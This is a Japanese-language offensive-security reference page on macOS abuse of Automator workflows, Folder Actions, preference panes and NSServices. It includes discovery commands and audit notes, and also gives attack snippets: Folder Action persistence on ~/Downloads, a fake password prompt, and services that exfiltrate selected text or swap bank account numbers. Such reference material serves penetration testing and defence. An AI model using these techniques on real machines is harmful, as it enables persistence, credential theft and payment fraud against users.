# macOS Automator、Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### 基本情報

**Automator** は macOS のビジュアル自動化ツールです。**actions**（`.action` bundles）で構成された **workflows**（`.workflow` bundles）を実行します。Automator は **Folder Actions**、**Quick Actions**、**Shortcuts** との統合にも使用されます。最近の macOS では、workflows を **Shortcuts** に **import** することもできるため、同じ悪意のあるロジックが Finder の Quick Action、`~/Library/Services/` 配下の user service、または従来の Automator actions を基盤とする shortcut として表示される可能性があります。

Automator actions は、workflow の実行時に Automator runtime によって読み込まれる **plugins** です。以下を実行できます。
- 任意の shell scripts を実行
- ファイルやデータを処理
- AppleScript を介してアプリケーションとやり取り
- 複雑な自動化のために連結

### 重要な理由

> [!WARNING]
> Automator workflows は、単純な document files に見えるため、**social-engineering** によって実行させられる可能性があります。`.workflow` bundle には、workflow の実行時に実行される embedded shell commands を含めることができます。Folder Actions と組み合わせることで、file events をトリガーとして **automatic persistence** を提供します。最近の Gatekeeper fixes により、**app-bundled Quick Actions**（`Contents/PlugIns/*.workflow`）も無害なデータではなく executable content として扱う必要があることが明らかになりました。

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### 攻撃: ソーシャルエンジニアリングされた Workflow

`.workflow` bundle は、ほとんどのユーザーには通常のドキュメントファイルに見えます。
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actionsは、監視対象のフォルダにファイルが追加された際にworkflowを自動実行します。
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions は再起動後も維持され、黙って実行されます。`~/Downloads` に対する Folder Action は、Safari、Chrome、AirDrop、メールの添付ファイルなど、**ダウンロードされたすべてのファイルが payload をトリガーする**ことを意味します。また、`System Events` はデフォルトの `~/Library/Scripts/Folder Action Scripts` の場所外にあるスクリプトを指す Folder Actions も登録できるため、未整理のパスを探す価値があります。関連する TCC の影響については、[TCC page](../macos-security-protections/macos-tcc/README.md) を確認してください。

---

## Preference Panes

### 基本情報

Preference panes（`.prefPane` bundles）は、**System Settings**（旧称 System Preferences）から読み込まれる plugin です。システムまたは third-party の機能向けに、設定用の UI panel を提供します。古いシステムでは `System Preferences` が直接読み込んでいましたが、新しいリリースでは、third-party pane は通常、System Settings から起動される **legacy loader XPC service** によって仲介されます。

### 重要である理由

- Preference panes は、System Settings / System Preferences が spawn した **trusted host process** 内で実行される
- modern systems では、その host が **`legacyLoader` XPC service** である場合があるため、重要な境界は依然として **trusted Apple UI process -> third-party code loading**
- third-party preference panes は、host process の **security context** と、その UI に付随する user trust を継承する
- ユーザーは Preference panes を **double-click** して install するため、social engineering が容易
- install 後は **persist** し、System Settings がその panel を開くたびに load される

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

悪意のある preference pane は、**pane host** のセキュリティコンテキストを継承します（従来は `System Preferences`、新しいバージョンでは多くの場合、`System Settings` によって起動される `legacyLoader` ヘルパー）：
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### 攻撃: インストールによる永続化
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

preference paneは、正規のシステムUIパネルを模倣して、**認証情報をphishする**ことができます：
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### 基本情報

**NSServices** により、アプリケーションは **Services menu**（右クリック → Services）を通じて、他のアプリに機能を提供できます。ユーザーがテキストまたはデータを選択してサービスを呼び出すと、選択したデータが処理のために **service provider** に**送信されます**。

Services はアプリケーションの `Info.plist` 内で `NSServices` key を使用して宣言され、pasteboard server（`pbs`）に登録されます。macOS はさらに **service cache** と **restriction policy** を保持しており、どのサービスを表示するか、また sandboxed caller に追加の警告を表示するかを決定します。

### これが重要な理由

- Services は**アプリケーション間のデータフロー**を受け取ります。あらゆるアプリケーションで選択されたテキストがサービスに送信されます
- 悪意のあるサービスは、password manager、email client、financial app からデータを取得できます
- Services は**変更したデータを呼び出し元アプリケーションに返す**ことができます（selection operation に対する man-in-the-middle）
- Service name は、正規のものに見えるように ("Format Text", "Encrypt Selection", "Share") 作成できます
- オプションの `NSRestricted` flag は security-relevant です。unrestricted としてマークされたサービスは、escape-prone なサービスに対して macOS が表示する警告なしに、sandboxed app から呼び出せる可能性があります<sup>[[2]](#references)</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### 攻撃: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### 攻撃: データの変更（Man-in-the-Middle）

サービスは、正規の機能を提供しているように見せかけながら、**返されるデータを変更**できます。
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple は、各 service 定義にオプションの `NSRestricted` boolean を指定できます。これが設定されている場合、その service が **sandbox または privacy boundary からの脱出**を助ける可能性があるため、macOS は sandbox 内の caller に警告します。offensive の観点では、次の 2 つの有用な audit path が得られます。

- **restricted としてマークされていない third-party service** を探す。特に、Apple Events、file access、その他の privileged action を proxy しているもの
- **強力な entitlement を持つ高価値の built-in service** を探す。例えば Script Editor が公開する service や Finder-backed helper などを調査し、user interaction だけで data-access primitive に変えられないか確認する

最近の良い例は **CVE-2022-48574** です。この脆弱性では、Services mechanism を悪用して、**想定された confirmation flow なしに TCC-protected user files へアクセス**できました。bug は修正済みですが、この technique は threat modeling において依然として有用です。caller に代わって file access や automation request を転送する service は、同じように厳密な scrutiny の対象にすべきです。<sup>[[2]](#references)</sup>

---

## Recent Security Notes

- **Quick Actions は executable content です**: Apple は 2024 年、app-bundled Automator Quick Action が通常の assessment なしで実行できる Gatekeeper bypass を修正しました。apps を audit する際は、helper script や login item を調査する場合と同じように、`Contents/PlugIns/*.workflow/Contents/document.wflow` を確認してください。[Gatekeeper のページ](../macos-security-protections/macos-gatekeeper.md)を参照してください。<sup>[[1]](#references)</sup>
- **Shortcuts は legacy Automator behavior を継承する可能性があります**: Apple は、third-party shortcut が **legacy Automator action** を使用し、想定された permission flow なしに Apple Events を送信していたことが判明した後、追加の user-consent prompt も導入しました。import された workflow と shortcut bundle では、`Run AppleScript`、`Run Shell Script`、その他同様の bridge action を確認してください。[TCC のページ](../macos-security-protections/macos-tcc/README.md)を参照してください。<sup>[[3]](#references)</sup>
- **Automator は現在も有効な privacy boundary です**: Apple は 2025 年、protected user data への access に関する別の Automator fix を提供しました。Automator が legacy surface であっても、workflow runner、Quick Action host、automation bridge は dead code ではなく、現在も有効な attack surface として扱ってください。<sup>[[4]](#references)</sup>

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### 環境設定パネル → TCC 権限昇格
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Password Manager の窃取
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## 参考文献

- [1] [Apple — macOS Ventura 13.7、Sonoma 14.7、Sequoia 15 のセキュリティコンテンツについて](https://support.apple.com/en-us/121238)
- [2] [Moonlock — NSServices exploit が macOS でどのように動作したか](https://moonlock.com/nsservices-macos)
- [3] [Apple — macOS Sonoma 14.6 のセキュリティコンテンツについて（CVE-2024-40834）](https://support.apple.com/en-us/120911)
- [4] [Apple — macOS Sequoia 15.4 のセキュリティコンテンツについて（CVE-2025-30460）](https://support.apple.com/en-us/122373)

{{#include ../../../banners/hacktricks-training.md}}
